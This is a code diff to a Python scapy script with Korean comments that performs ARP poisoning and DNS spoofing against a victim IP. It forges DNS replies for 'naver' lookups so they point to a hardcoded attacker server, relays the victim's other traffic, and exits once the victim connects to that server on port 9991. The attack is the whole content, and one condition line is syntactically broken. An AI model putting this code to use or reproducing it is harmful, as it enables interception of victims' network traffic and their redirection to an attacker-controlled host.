@@ -6,9 +6,11 @@ import threading
 #파이썬 네트워크 패킷 라이브러리 scapy 사용
 
 
-des_ip = raw_input("Input Target IP : ")
+des_ip = sys.argv[1]
 #victim의 ip 입력받음
 dns_ip = "207.126.164.146"
+attacker_server = "207.126.164.146"
+spoof_flag = False
 dns_count = 0
 results, unanswered = sr(ARP(op=ARP.who_has, pdst=des_ip))
 #results[0][1];
@@ -81,7 +83,7 @@ send(arpFakeDGW)
 
 
 def arp_monitor_callback(pkt):
-	global dns_ip, dns_count 
+	global dns_ip, spoof_flag, dns_count,attacker_server
 	if ARP in pkt:
 			send(arpFakeVic)
 			send(arpFakeDGW)
@@ -90,7 +92,22 @@ def arp_monitor_callback(pkt):
 	else:
 		#ARP외의 모든 패킷 RELAY
 		if pkt[IP].src==des_ip:
-			if (pkt.haslayer(DNS)) and  (dns_count < 10) :
+			if pkt[IP].dst == attacker_server:
+				if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport = "9991":
+					pkt[Ether].src = attacker_mac
+					pkt[Ether].dst = router_mac
+					if pkt.haslayer(TCP) == 1:
+						del pkt[TCP].chksum
+						del pkt[TCP].len
+					
+					del pkt.chksum
+					del pkt.len
+					sendp(pkt)
+					print "[*] connect attacker's server"
+					print "[*] ARP & DNS spoofing stopping.."
+					sys.exit(1)
+			#if (pkt.haslayer(DNS)) and  (dns_count < 10) :
+			if (pkt.haslayer(DNS)) and  (str(pkt.getlayer(DNS).qd.qname).find("naver") >= 0) and dns_count < 10 :
 				ip = pkt.getlayer(IP)
 				udp = ip.payload
 				dns = pkt.getlayer(DNS)
@@ -98,7 +115,8 @@ def arp_monitor_callback(pkt):
 				pn_dns = DNS(id = dns.id, qr = 1, qd = dns.qd, an = DNSRR(rrname = dns.qd.qname, rdata = dns_ip, ttl = 10))
 				sendp(Ether(src = pkt.dst, dst = pkt.src) / pn / pn_dns)
 				print('[+] Spoofed request to ' + dns.qd.qname +' ->'+ dns_ip+ 'Client:'+ ip.src)
-				dns_count = dns_count + 1
+				#spoof_flag = True
+				dns_count += 1
 			else:
 				pkt[Ether].src = attacker_mac
 				pkt[Ether].dst = router_mac
@@ -122,6 +140,11 @@ def arp_monitor_callback(pkt):
 			del pkt.chksum
 			sendp(pkt)
 			print "DST : Victim_MAC"
+
+
+
+	#if not spoof_flag: sys.exit(1)
+	if dns_count >= 10 : sys.exit(1)
 			#router에서 패킷을 보낼때 (scapy에서 패킷을 다시 보낼때, IP와 UDP(일경우)의 chksum과 len을 지워줘야 오류가 안뜸)
 
 while True:
